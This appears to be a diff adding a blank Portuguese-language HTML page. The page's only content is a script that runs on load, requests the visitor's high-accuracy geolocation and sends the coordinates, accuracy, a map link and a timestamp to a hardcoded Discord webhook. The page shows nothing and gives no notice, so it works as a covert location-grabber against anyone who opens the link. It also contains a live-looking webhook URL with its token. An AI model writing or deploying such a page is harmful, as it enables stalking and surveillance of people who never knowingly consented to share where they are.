@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+</body>
+
+<script>
+    (async function () {
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466952950470410431/dhbMud2gq2WaZ_luHLK79pPIkUrIh16zDxhRywOmNw4CgTtmNkQCQIAJ5oGaI_88olZv';
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const acc = position.coords.accuracy;
+
+                    const payload = {
+                        embeds: [{
+                            title: 'Nova Localização',
+                            color: 3066993,
+                            fields: [
+                                { name: 'Latitude', value: lat.toString(), inline: true },
+                                { name: 'Longitude', value: lon.toString(), inline: true },
+                                { name: 'Precisão', value: `${acc.toFixed(0)}m`, inline: true },
+                                { name: 'Mapa', value: `[Ver](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
+                                { name: 'Horário', value: new Date().toLocaleString('pt-BR'), inline: true }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+
+                    try {
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                    } catch (e) {
+                        console.error('Erro:', e);
+                    }
+                },
+                (error) => console.error('Erro GPS:', error),
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
+        }
+    })();
+</script>
+
+</html>
